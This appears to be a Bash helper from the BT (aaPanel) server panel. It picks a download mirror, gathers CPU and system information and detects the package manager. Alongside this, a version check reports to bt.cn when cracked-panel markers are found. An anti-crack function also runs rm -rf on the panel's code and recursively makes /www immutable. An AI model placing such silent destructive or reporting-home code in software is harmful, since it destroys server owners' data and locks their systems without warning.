#!/bin/bash
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:~/bin
pyenv_bin=/www/server/panel/pyenv/bin
rep_path=${pyenv_bin}:$PATH
if [ -d "$pyenv_bin" ];then
	PATH=$rep_path
fi
export PATH
export LANG=en_US.UTF-8
export LANGUAGE=en_US:en

get_node_url(){
	nodes=(http://dg2.bt.cn http://183.235.223.101:3389 http://dg1.bt.cn http://125.88.182.172:5880 http://103.224.251.67 http://119.188.210.21:5880 http://download.bt.cn http://45.32.116.160 http://128.1.164.196);
	i=1;
	for node in ${nodes[@]};
	do
		start=`date +%s.%N`
		result=`curl -sS --connect-timeout 3 -m 60 $node/check.txt`
		if [ "$result" = 'True' ];then
			end=`date +%s.%N`
			start_s=`echo $start | cut -d '.' -f 1`
			start_ns=`echo $start | cut -d '.' -f 2`
			end_s=`echo $end | cut -d '.' -f 1`
			end_ns=`echo $end | cut -d '.' -f 2`
			time_micro=$(( (10#$end_s-10#$start_s)*1000000 + (10#$end_ns/1000 - 10#$start_ns/1000) ))
			time_ms=$(($time_micro/1000))
			values[$i]=$time_ms;
			urls[$time_ms]=$node
			i=$(($i+1))
			if [ $time_ms -lt 100 ];then
				break;
			fi
		fi
	done
	j=5000
	for n in ${values[@]};
	do
		if [ $j -gt $n ];then
			j=$n
		fi
		if [ $j -lt 100 ];then
			break;
		fi
	done
	if [ $j = 5000 ];then
		NODE_URL='http://download.bt.cn';
	else
		NODE_URL=${urls[$j]}
	fi
}

GetCpuStat(){
	time1=$(cat /proc/stat |grep 'cpu ')
	sleep 1
	time2=$(cat /proc/stat |grep 'cpu ')
	cpuTime1=$(echo ${time1}|awk '{print $2+$3+$4+$5+$6+$7+$8}')
	cpuTime2=$(echo ${time2}|awk '{print $2+$3+$4+$5+$6+$7+$8}')
	runTime=$((${cpuTime2}-${cpuTime1}))
	idelTime1=$(echo ${time1}|awk '{print $5}')
	idelTime2=$(echo ${time2}|awk '{print $5}')
	idelTime=$((${idelTime2}-${idelTime1}))
	useTime=$(((${runTime}-${idelTime})*3))
	[ ${useTime} -gt ${runTime} ] && cpuBusy="true"
	if [ "${cpuBusy}" == "true" ]; then
		cpuCore=$((${cpuInfo}/2))
	else
		cpuCore=$((${cpuInfo}-1))
	fi
}
GetPackManager(){
	if [ -f "/usr/bin/yum" ] && [ -f "/etc/yum.conf" ]; then
		PM="yum"
	elif [ -f "/usr/bin/apt-get" ] && [ -f "/usr/bin/dpkg" ]; then
		PM="apt-get"		
	fi
}

bt_check(){
	p_path=/www/server/panel/class/panelPlugin.py
	if [ -f $p_path ];then
		is_ext=$(cat $p_path|grep btwaf)
		if [ "$is_ext" != "" ];then
			send_check
		fi
	fi
	
	p_path=/www/server/panel/BTPanel/templates/default/index.html
	if [ -f $p_path ];then
		is_ext=$(cat $p_path|grep fbi)
		if [ "$is_ext" != "" ];then
			send_check
		fi
	fi
}

send_check(){
	chattr -i /etc/init.d/bt
	chmod +x /etc/init.d/bt
	p_path2=/www/server/panel/class/common.py
	p_version=$(cat $p_path2|grep "version = "|awk '{print $3}'|tr -cd [0-9.])
	curl -sS --connect-timeout 3 -m 60 http://www.bt.cn/api/panel/notpro?version=$p_version
	NODE_URL=""
	exit 0;
}
init_check(){
	CRACK_URL=(oss.yuewux.com);
	for url in ${CRACK_URL[@]};
	do
		CRACK_INIT=$(cat /etc/init.d/bt |grep ${url})
		if [ "${CRACK_INIT}" ];then
			rm -rf /www/server/panel/class/*
			chattr +i /www/server/panel/class
			chattr -R +i /www/server/panel
			chattr +i /www 
		fi
	done
}
GetSysInfo(){
	if [ "${PM}" = "yum" ]; then
		SYS_VERSION=$(cat /etc/redhat-release)
	elif [ "${PM}" = "apt-get" ]; then
		SYS_VERSION=$(cat /etc/issue)
	fi
	SYS_INFO=$(uname -a)
	SYS_BIT=$(getconf LONG_BIT)
	MEM_TOTAL=$(free -m|grep Mem|awk '{print $2}')
	CPU_INFO=$(getconf _NPROCESSORS_ONLN)
	GCC_VER=$(gcc -v 2>&1|grep "gcc version"|awk '{print $3}')
	CMAKE_VER=$(cmake --version|grep version|awk '{print $3}')

	echo -e ${SYS_VERSION}
	echo -e Bit:${SYS_BIT} Mem:${MEM_TOTAL}M Core:${CPU_INFO} gcc:${GCC_VER} cmake:${CMAKE_VER}
	echo -e ${SYS_INFO}
}
cpuInfo=$(getconf _NPROCESSORS_ONLN)
if [ "${cpuInfo}" -ge "4" ];then
	GetCpuStat
else
	cpuCore="1"
fi
GetPackManager
if [ ! $NODE_URL ];then
	echo '正在选择下载节点...';
	get_node_url
	bt_check
fi
